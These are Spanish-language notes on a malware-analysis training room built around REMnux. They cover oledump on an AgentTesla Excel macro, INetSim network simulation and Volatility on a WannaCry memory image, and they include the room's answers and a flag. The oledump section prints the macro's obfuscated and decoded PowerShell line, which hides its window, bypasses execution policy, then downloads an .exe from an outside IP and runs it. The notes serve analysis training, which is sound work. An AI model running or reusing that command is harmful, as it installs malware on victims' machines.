
**==Introducción==**

Analizar software potencialmente malicioso puede ser abrumador, especialmente cuando forma parte de un incidente de seguridad en curso. Este análisis supone una gran presión para el analista. En la mayoría de los casos, los resultados deben ser lo más precisos posible, y los analistas utilizan diferentes herramientas, equipos y entornos para lograrlo. En esta sala, utilizaremos la máquina virtual REMnux.

![[Pasted image 20250909175455.png]]

La máquina virtual REMnux es una distribución especializada de Linux. Ya incluye herramientas como Volatility, YARA, Wireshark, oledump e INetSim. Además, proporciona un entorno de pruebas para analizar software potencialmente malicioso sin poner en riesgo el sistema principal. Es su laboratorio listo para usar sin las complicaciones de las instalaciones manuales.


---

**==Acceso a la máquina==**

Usaremos la AttackBox y la máquina virtual conectada en esta sala. Para iniciar la máquina virtual REMnux, haga clic en el botón verde "Iniciar máquina" que aparece a continuación.

El equipo se iniciará en pantalla dividida y podría tardar de 2 a 3 minutos en iniciarse. Se espera que tenga un resultado similar al de la imagen a continuación.

![[Pasted image 20250909175607.png]]

Si la máquina no aparece, haga clic en el botón azul "Mostrar vista dividida" en la parte superior de la página.

Tenga en cuenta que casi todos los archivos que usaremos en esta sala se encuentran en el directorio **Desktop/tasks**.


---

**==Análisis de archivos==**

En esta tarea, usaremos oledump.py para realizar un análisis estático de un documento de Excel potencialmente malicioso.

Oledump.py es una herramienta de Python que analiza archivos OLE2, comúnmente llamados Almacenamiento Estructurado o Formato Binario de Archivo Compuesto. OLE significa Vinculacrón e Incrustación de Objetos, una tecnología propia de Microsoft. Los archivos OLE2 se suelen utilizar para almacenar múltiples tipos de datos, como documentos, hojas de cálculo y presentaciones, en un solo archivo. Esta herramienta es útil para extraer y examinar el contenido de archivos OLE2, lo que la convierte en un recurso valioso para el análisis forense y la detección de malware.

¡Comencemos!

Utilizando la máquina virtual asociada a la tarea 2 (la máquina virtual REMnux), navegue al directorio /home/ubuntu/Desktop/tasks/agenttesla/. Nuestro archivo de destino se llama agenttesla.xlsm. Ejecute el comando oledump.py agenttesla.xlsm. Vea la terminal a continuación.

![[Pasted image 20250909175726.png]]

Según el análisis de archivos de OleDump, es posible que un script de VBA esté incrustado en el documento y se encuentre dentro de xl/vbaProject.bin. Por lo tanto, oleDump le asignará un índice A, aunque esto puede variar. La A (índice) + Números se denominan flujos de datos.

Ahora, debemos tener en cuenta el flujo de datos con la letra M mayúscula. Esto significa que hay una macro, y quizás quieras revisar este flujo de datos: "VBA/ThisWorkbook".

¡Vamos a revisarlo! Ejecutamos el comando oledump.py agenttesla.xlsm -s 4. Este comando ejecutará oledump y examinará el flujo de datos de interés usando el parámetro -s 4, donde "-s" es la abreviatura de "-select" y el número cuatro (4), ya que el flujo de datos de interés está en cuarto lugar (A4: M 688 "VBA/ThisWorkbook").

![[Pasted image 20250909175748.png]]

![[Pasted image 20250909175812.png]]
![[Pasted image 20250909175831.png]]

Los resultados anteriores están en formato de volcado hexadecimal. Puede que algunas palabras resulten familiares para un experto. Sin embargo, esto sigue siendo un reto, ¿no cree? Así que hagámoslo más legible y fácil de entender.

Ejecutaremos el parámetro adicional ``--vbadecompress`` además del comando anterior. Al usar este parámetro, oledump descomprimirá automáticamente cualquier macro VBA comprimida que encuentre a un formato más legible, lo que facilita el análisis de su contenido.

![[Pasted image 20250909175857.png]]

![[Pasted image 20250909175909.png]]

  


Esto es mucho mejor, ¿verdad?

Ahora, no necesitamos leer el script completo, sino familiarizarnos con algunos caracteres y comandos. Nos interesa el valor de Sqtnew, ya que, si revisamos el script, contiene una IP pública, un PDF y un archivo .exe. Quizás queramos analizar esto más a fondo.

![[Pasted image 20250909175940.png]]

```
Sqtnew = "^p*o^*w*e*r*s^^*h*e*l^*l* *^-*W*i*n*^d*o*w^*S*t*y*^l*e* *h*i*^d*d*^e*n^* *-*e*x*^e*c*u*t*^i*o*n*pol^icy* *b*yp^^ass*;* $TempFile* *=* *[*I*O*.*P*a*t*h*]*::GetTem*pFile*Name() | Ren^ame-It^em -NewName { $_ -replace 'tmp$', 'exe' } Pass*Thru; In^vo*ke-We^bRe*quest -U^ri ""http://193.203.203.67/rt/Doc-3737122pdf.exe"" -Out*File $TempFile; St*art-Proce*ss $TempFile;"
```

Copiaremos el primer valor de Sqtnew y lo pegaremos en el área de entrada de CyberChef. Puede abrir una copia local de CyberChef dentro de la máquina virtual REMnux o acceder a la versión en línea a través de este enlace. Utilice la opción que mejor le funcione. Le recomendamos consultar nuestra sección sobre CyberChef para familiarizarse con la herramienta.

A continuación, seleccione la operación Buscar/Reemplazar dos veces. Al revisar el script, el segundo y el tercer valor de Sqtnew tienen un comando para reemplazar * por "" y ^ por "". Suponemos que "" significa que no hay ningún valor. Por lo tanto, con nuestra primera operación seleccionada, asignamos el valor * y seleccionamos CADENA SIMPLE como parámetros adicionales. En cambio, no asignamos ningún valor al cuadro Reemplazar. Lo mismo ocurre con nuestra segunda operación: asignamos el valor ^ y seleccionamos CADENA SIMPLE, y el cuadro Reemplazar no tiene ningún valor. Vea la imagen a continuación.

![[Pasted image 20250909180007.png]]

¡Ahora es más legible! Sin embargo, para quienes empiezan, puede ser un reto. Por eso, abordaremos los comandos más básicos.

```-shell-session
"powershell -WindowStyle hidden -executionpolicy bypass; $TempFile = [IO.Path]::GetTempFileName() | Rename-Item -NewName { $_ -replace 'tmp$', 'exe' }  PassThru; Invoke-WebRequest -Uri ""http://193.203.203.67/rt/Doc-3737122pdf.exe"" -OutFile $TempFile; Start-Process $TempFile;"
```


¡Veámoslo en detalle!

- En PowerShell, ejecutar el parámetro -WindowStyle permite controlar cómo se muestra la ventana de PowerShell al ejecutar un script o comando. En este caso, "oculto" significa que la ventana de PowerShell no será visible para el usuario.

- De forma predeterminada, PowerShell restringe la ejecución de scripts por razones de seguridad. El parámetro -executionpolicy permite anular esta política. "Omitir" significa que la política de ejecución se ignora temporalmente, lo que permite que cualquier script se ejecute sin restricciones.

- Invoke-WebRequest se usa comúnmente para descargar archivos de internet.

	- Uri especifica la URL del recurso web que se desea recuperar. En nuestro caso, el script descarga el recurso Doc-3737122pdf.exe desde http://193.203.203.67/rt/.

	- OutFile especifica el archivo local donde se guardará el contenido descargado. En este caso, el archivo Doc-3737122pdf.exe se guardará en $TempFile.

- El proceso de inicio se utiliza para ejecutar el archivo descargado, que se almacena en $TempFile tras la solicitud web.

En resumen, al abrir el documento agenttesla.xlsm, se ejecutará una macro. Esta macro contiene un script de VBA. El script se ejecutará y ejecutará PowerShell para descargar un archivo llamado Doc-3737122pdf.exe desde http://193.203.203.67/rt/, guardarlo en la variable $TempFile y luego ejecutar o iniciar la ejecución del archivo dentro de esta variable (un archivo binario o .exe, Doc-3737122pdf.exe). Esta es una técnica habitual que utilizan los cibercriminales para evitar la detección temprana. ¡Qué desagradable, ¿verdad?!

¡Felicidades por descubrirlo!

Answer the questions below

What Python tool analyzes OLE2 files, commonly called Structured Storage or Compound File Binary Format?
respuesta oledump.py

What tool parameter we used in this task allows you to select a particular data stream of the file we are using it with?
respuesta -s

During our analysis, we were able to decode a PowerShell script. What command is commonly used for downloading files from the internet?
respuesta Invoke-WebRequest

What file was being downloaded using the PowerShell script?
respuesta Doc-3737122pdf.exe

During our analysis of the PowerShell script, we noted that a file would be downloaded. Where will the file being downloaded be stored?
respuesta $TempFile

Using the tool, scan another file named **possible_malicious.docx** located in the `/home/ubuntu/Desktop/tasks/agenttesla/` directory. How many data streams were presented for this file? 
respuesta  16

![[Pasted image 20250910134019.png]]

Using the tool, scan another file named **possible_malicious.docx** located in the `/home/ubuntu/Desktop/tasks/agenttesla/` directory. At what data stream number does the tool indicate a macro present?
respuesta  8

![[Pasted image 20250910134021.png]]


---

**==Red falsa para facilitar el análisis==**

Durante el análisis dinámico, es fundamental observar el comportamiento del software potencialmente malicioso, especialmente sus actividades de red. Existen diversos enfoques para ello. Podemos crear una infraestructura completa, un entorno virtual con diferentes máquinas centrales y más. Como alternativa, existe una herramienta dentro de nuestra máquina virtual REMnux llamada INetSim: ¡Suite de Simulación de Servicios de Internet!

Utilizaremos las funciones de INetSim para simular una red real en esta tarea.

**Máquinas virtuales**

Para esta tarea, utilizaremos dos (2) máquinas. La primera es nuestra máquina REMnux, vinculada a la tarea de acceso a la máquina. La segunda máquina virtual es AttackBox. Para iniciar AttackBox, haga clic en el botón azul "Iniciar AttackBox" en la parte superior de la página. Tenga en cuenta que puede cambiar fácilmente entre los cuadros haciendo clic en ellos. Vea el cuadro resaltado en la imagen a continuación.

![[Pasted image 20250909180418.png]]

**INetSim**

Antes de empezar, debemos configurar la herramienta INetSim en nuestra máquina virtual REMnux. No se preocupe; es un cambio de configuración sencillo. Primero, verifique la dirección IP asignada a su máquina. Puede comprobarla con el comando ifconfig o simplemente verificando la dirección IP después de ubuntu@ desde la terminal. Las direcciones IP pueden variar.

![[Pasted image 20250909180457.png]]

Aquí, la IP de la máquina es MACHINE_IP. Anótela, ya que la necesitaremos.

A continuación, debemos cambiar la configuración de INetSim ejecutando el comando ``sudo nano /etc/inetsim/inetsim.conf`` y buscando el valor #``dns_default_ip 0.0.0.0``.

![[Pasted image 20250909180518.png]]

Elimine el comentario o # y cambie el valor de ``dns_default_ip de 0.0.0.0`` a la dirección IP de la máquina que identificó anteriormente. En nuestro caso, es MACHINE_IP. Guarde el archivo con el comando CRTL + O, presione Enter y salga con CTRL + X.

Confirme que los cambios se hayan realizado correctamente comprobando el valor de ``dns_default_ip`` con el comando ``cat /etc/inetsim/inetsim.conf | grep dns_default_ip``. Vea a continuación.

![[Pasted image 20250909180541.png]]

Por último, ejecute el comando ``sudo inetsim`` para iniciar la herramienta.

![[Pasted image 20250909180603.png]]

Después de ejecutar el comando, asegúrese de ver la frase "Simulación en ejecución" al final del resultado e ignore el error http_80_tcp—¡falló! ¡Nuestra red falsa ya está funcionando!

¡Pasemos a nuestra AttackBox!

**AttackBox**

Desde esta máquina virtual, abra un navegador y acceda a la dirección IP de nuestro REMnux con el comando https://MACHINE_IP. Esto mostrará un riesgo de seguridad; ignórelo, haga clic en "Avanzar", luego en "Aceptar el riesgo" y "Continuar".

![[Pasted image 20250909180643.png]]

¡Una vez hecho esto, deberías ser redirigido a la página de inicio de INetSim!

![[Pasted image 20250909180710.png]]

Un comportamiento habitual del malware es descargar otro binario o script. Intentaremos imitar este comportamiento obteniendo otro archivo de INetsim. Podemos hacerlo mediante la CLI o el navegador, pero usaremos la CLI para que sea más realista. Use este comando: ``sudo wget https://MACHINE_IP/second_payload.zip --no-check-certificate``.

![[Pasted image 20250909180749.png]]

También puedes intentar descargar otro archivo. Por ejemplo, descarga second_payload.ps1 con el comando: ``sudo wget https://MACHINE_IP/second_payload.ps1 --no-check-certificate``.

Para verificar que se descargaron los archivos, revisa la carpeta raíz. Consulta el ejemplo a continuación.

![[Pasted image 20250909180823.png]]

¡Todos estos son archivos falsos! Intenta abrir second_payload.ps1. Al ejecutarlo, te redirigirá a la página principal de INetSim.

Lo que hicimos aquí es imitar el comportamiento de un malware: intentará acceder a un servidor o URL y luego descargará un archivo secundario que podría contener otro malware.

**Informe de conexión**

Por último, regresa a tu máquina virtual REMnux y detén INetSim. Por defecto, creará un informe sobre las conexiones capturadas. Este suele guardarse en el directorio ``/var/log/inetsim/report/``. Deberías ver algo como esto.

![[Pasted image 20250909180852.png]]

Lea el archivo con el comando ``sudo cat /var/log/inetsim/report/report.2594.txt``. Esto puede variar según su equipo.

![[Pasted image 20250909180925.png]]

Estos son los registros de la ejecución de la herramienta. Podemos ver las conexiones realizadas a la URL, el protocolo y el método que utiliza. También podemos ver el archivo falso descargado.

Answer the questions below

Download and scan the file named **flag.txt** from the terminal using the command ``sudo wget https://MACHINE_IP/flag.txt --no-check-certificate``. What is the flag?
respuesta  Tryhackme{remnux_edition}

descargamos el archivo desde la consola 
![[Pasted image 20250910180118.png]]

verificamos que el archivo se haya descagado y lo abrimos 
![[Pasted image 20250910180036.png]]

encontramos la flag
![[Pasted image 20250910180021.png]]


After stopping the inetsim, read the generated report. Based on the report, what URL Method was used to get the file flag.txt?
respuesta GET

al detener inetsim nos da la ubicacion y el nombre del archivo creado
![[Pasted image 20250910180248.png]]

abrimos el archivo desde la terminal para ver el reporte 
![[Pasted image 20250910180319.png]]



---

**==Investigación de Memoria: Preprocesamiento de Evidencia==**

Una de las prácticas de investigación más comunes en la informática forense es el preprocesamiento de evidencia. Esto implica ejecutar herramientas y guardar los resultados en formato de texto o JSON. El analista suele recurrir a herramientas como Volatility al trabajar con imágenes de memoria como evidencia. Esta herramienta ya está incluida en la máquina virtual REMnux. Los comandos de Volatility se ejecutan para identificar y extraer artefactos específicos de las imágenes de memoria, y el resultado puede guardarse en archivos de texto para su posterior análisis. De igual forma, podemos ejecutar un script con los diferentes parámetros de la herramienta para preprocesar la evidencia adquirida más rápidamente.

**Preprocesamiento con Volatility**

En esta tarea, utilizaremos la versión 3 de la herramienta Volatility. Sin embargo, no profundizaremos en la investigación y el análisis de los resultados; ¡podríamos escribir un libro entero sobre ello! En su lugar, queremos que se familiarice con la herramienta y se familiarice con su funcionamiento. Ejecute el comando según las instrucciones y espere a que se muestre el resultado. Cada complemento tarda de 2 a 3 minutos en mostrar el resultado.

Estos son algunos de los parámetros o plugins que usaremos. Nos centraremos en los plugins de Windows.

- windows.pstree.PsTree
- windows.pslist.PsList
- windows.cmdline.CmdLine
- windows.filescan.FileScan
- windows.dlllist.DllList
- windows.malfind.Malfind
- windows.psscan.PsScan

¡Comencemos!

En tu RemnuxVM, ejecuta ``sudo su``, luego navega al directorio /home/ubuntu/Desktop/tasks/Wcry_memory_image/; nuestro archivo será wcry.mem. Ejecutaremos cada plugin después del comando ``vol3 -f wcry.mem``.

**PsTree**

Este complemento enumera los procesos en un árbol según el ID del proceso principal.

![[Pasted image 20250909181145.png]]
![[Pasted image 20250909181156.png]]

**PsList**

Este complemento se utiliza para listar todos los procesos activos actualmente en el equipo.

![[Pasted image 20250909181226.png]]
![[Pasted image 20250909181237.png]]

**CmdLine**

Este complemento se utiliza para listar los argumentos de la línea de comandos del proceso.

![[Pasted image 20250909181307.png]]
![[Pasted image 20250909181317.png]]

**FileScan**

Este complemento escanea objetos de archivo en una imagen de memoria específica de Windows. Los resultados contienen más de 1400 líneas.

![[Pasted image 20250909181415.png]]
![[Pasted image 20250909181428.png]]

**DllList**

Este complemento lista los módulos cargados en una imagen de memoria de Windows específica. Debido a una limitación de texto, no incluye el icono "Ver resultados".

![[Pasted image 20250909181458.png]]

**PsScan**

Este complemento se utiliza para escanear procesos presentes en una imagen de memoria específica de Windows.

![[Pasted image 20250909181524.png]]
![[Pasted image 20250909181536.png]]

**Malfind**

Este complemento se utiliza para listar rangos de memoria de procesos que podrían contener código inyectado. No habrá un icono de "Ver resultados" para este complemento debido a la limitación de texto.

![[Pasted image 20250909181606.png]]

Para obtener más información sobre otros plugins, puede consultar este [enlace](https://volatility3.readthedocs.io/en/stable/volatility3.plugins.html).

Ahora, los plugins se ejecutan individualmente y se puede ver el resultado. Lo que haremos ahora es procesarlo en bloque. Recuerde que una de las prácticas de investigación implica preprocesar la evidencia y guardar los resultados en archivos de texto, ¿verdad? La pregunta es ¿cómo?

¿La respuesta? ¡Ejecute una sentencia de bucle! Vea el comando a continuación.

```
root@MACHINE_IP:/home/ubuntu/Desktop/tasks/Wcry_memory_image$ for plugin in windows.malfind.Malfind windows.psscan.PsScan windows.pstree.PsTree windows.pslist.PsList windows.cmdline.CmdLine windows.filescan.FileScan windows.dlllist.DllList; do vol3 -q -f wcry.mem $plugin > wcry.$plugin.txt; done
```

Analicemos este comando.

- Creamos una variable llamada $plugin con los valores de cada plugin de volatility.
- Luego ejecutamos los parámetros vol3: -q, que significa modo silencioso o no mostrar el progreso en la terminal.
- Y -f, que significa leer desde la captura de memoria.
- El comando plugin > wcry.plugin.done; significa ejecutar volatility con los plugins y generarlo en un archivo con wcry al principio del texto, seguido del nombre de los plugins y con la extensión .txt. Repetimos hasta que se use el valor de la variable $plugin.

Después de ejecutar el comando, no verá ninguna salida desde la terminal; verá los archivos dentro del mismo directorio donde lo ejecutó.

![[Pasted image 20250909181959.png]]

**Preprocesamiento con cadenas**

A continuación, preprocesaremos la imagen de memoria con la utilidad de cadenas de Linux. Extraeremos las cadenas ASCII, little-endian de 16 bits y big-endian de 16 bits. Vea el comando a continuación.

![[Pasted image 20250909182027.png]]

El comando ``strings`` extrae texto ASCII imprimible. La opción ``-e l`` indica a strings que extraiga cadenas little endian de 16 bits. La opción ``-e b`` indica a strings que extraiga cadenas big endian de 16 bits. Los tres formatos de cadena pueden proporcionar información útil sobre el sistema investigado.

Debería obtener el mismo resultado a continuación.

![[Pasted image 20250909182047.png]]

Ahora, esto está listo para el análisis, pero recuerde, nuestro objetivo aquí en esta tarea es preprocesar la evidencia para que cualquier analista que investigue esto pueda agilizar las búsquedas y el análisis.

Answer the questions below

What plugin lists processes in a tree based on their parent process ID?
respuesta PsTree

What plugin is used to list all currently active processes in the machine?
respuesta PsList

What Linux utility tool can extract the ASCII, 16-bit little-endian, and 16-bit big-endian strings?
respuesta strings

By running vol3 with the Malfind parameter, what is the first (1st) process identified suspected of having an injected code?
respuesta csrss.exe

ejecutamos el comando de malfind
![[Pasted image 20250911215144.png]]

Continuing from the previous question (Question 4), what is the second (2nd) process identified suspected of having an injected code?
respuesta winlogon.exe

verificamos el segundo proceso listado
![[Pasted image 20250911215144.png]]

By running vol3 with the DllList parameter, what is the file path or directory of the binary @WanaDecryptor@.exe?
respuesta  C:\Intel\ivecuqmanpnirkt615\@WanaDecryptor@.exe

ejecutamos el comando dllList
![[Pasted image 20250911215458.png]]

filtramos el archivo que estamos buscando ya que la lista es extensa
![[Pasted image 20250911220306.png]]


---

**==Conclusión==**

En esta sala, tuvimos una introducción práctica a la máquina virtual REMnux, donde pudimos usar herramientas como oledump.py para el análisis de archivos. También creamos una red falsa con INetSim y preprocesamos una captura de memoria con volatility y Strings. ¡Todas estas herramientas están incluidas en la máquina virtual REMNux! Sin embargo, aún no hemos usado muchas de sus herramientas, ya que podríamos crear diferentes salas para que cada uno aprenda y se familiarice con ellas.

Como nota al margen, REMnux Distro se centra principalmente en el análisis de programas, documentos o archivos potencialmente maliciosos, memoria y objetos similares.